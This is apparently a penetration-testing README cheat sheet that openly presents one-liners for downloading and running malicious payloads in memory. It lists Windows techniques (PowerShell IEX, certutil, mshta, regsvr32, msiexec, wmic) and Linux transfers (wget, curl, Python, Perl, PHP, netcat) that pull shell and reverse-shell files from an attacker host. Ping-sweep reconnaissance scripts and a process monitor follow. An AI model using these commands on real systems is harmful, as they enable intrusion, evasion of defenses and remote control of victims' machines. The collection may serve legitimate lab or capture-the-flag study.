# One-Liners-Handy-Scripts
Simple One-Liners to download malicious payloads into memory & handy scripts 


Windows One-Liners to Download Remote Payloads:

Powershell:
```
powershell "IEX( IWR http://10.10.10.10:9999 -UseBasicParsing)"

powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:9999/test.bat'))
```

Certutil:
```
certutil -urlcache -f http://10.10.10.10:9999/shell.exe shell.exe
```

Mshta:
```
mshta http://10.10.10.10:9999/rev.hta
mshta vbscript:Close(Execute("GetObject(""script:http://10.10.10.10:9999/rev.sct"")"))
```

Regsvr32:
```
regsvr32 /s /n /u /i:http://10.10.10.10:9999/rev.sct scrobj.dll
```

Msiexec:
```
msiexec /q /i http://10.10.10.10:9999/rev.msi
```

Wmic:
```
wmic os get /FORMAT:"http://10.10.10.10:9999/rev.xsl"
```

File Transfers (Linux)

Wget:
```
wget http://10.10.10.10:9999/file.sh -O /tmp/file.sh
```
Curl:
```
curl http://10.10.10.10:9999/file.sh -o /tmp/file.sh
```
Python
```
python -c "import urllib; f = urllib.URLopener(); f.retrieve('http://10.10.10.10:9999/rev.exe', '/tmp/rev.exe');"
```
Perl
```
perl -e 'use File::Fetch; my $ff=File::Fetch->new(uri => "http://10.10.10.10:9999/rev.sh"); my $file = $ff->fetch() or die $ff->error;'
```
PHP
```
echo "<?php file_put_contents('nameOfFile', fopen('http://10.10.10.10:9999/shell.php', 'r')); ?>" > shell.php
```
Netcat:
```
Victim: nc -l -p 4444 > file.sh
Attacker: nc -w 3 10.10.10.20 4444 < file.sh
```
FreeBSD:
```
fetch 10.10.10.10:9999/shell.py
```

Handy Scripts:

Monitor processes in real-time *Thanx to Ippsec 
```
#!/bin/bash

IFS=$'\n'
old_process=$(ps -eo command)

while true; do
  new_process=$(ps -eo command)
  diff <(echo "$old_process") <(echo "$new_process") |grep [\<\>]
  sleep 1
  old_process=$new_process
done
```
Ping Sweeps

Linux
```
for i in {1..254}; do ping -c 1 -W 1 10.10.10.$i | grep 'from'; done
```
Windows
```
1..254 | % {"10.10.10.$($_): $(Test-Connection -count 1 -comp 10.10.10.$($_) -quiet)"}
```
Python
```
#!/usr/bin/python
import multiprocessing, subprocess, os
def pinger( job_q, results_q ):
    DEVNULL = open(os.devnull,'w')
    while True:
        ip = job_q.get()
        if ip is None: break
        try:
            subprocess.check_call(['ping','-c1',ip],stdout=DEVNULL)
            results_q.put(ip)
        except:
            pass

if __name__ == '__main__':
    pool_size = 255
    jobs = multiprocessing.Queue()
    results = multiprocessing.Queue()
    pool = [ multiprocessing.Process(target=pinger, args=(jobs,results)) for i in range(pool_size) ]
    for p in pool:
        p.start()

    for i in range(1,255):
        jobs.put('10.10.10.{0}'.format(i))

    for p in pool:
        jobs.put(None)

    for p in pool:
        p.join()

    while not results.empty():
        ip = results.get()
        print(ip)
```

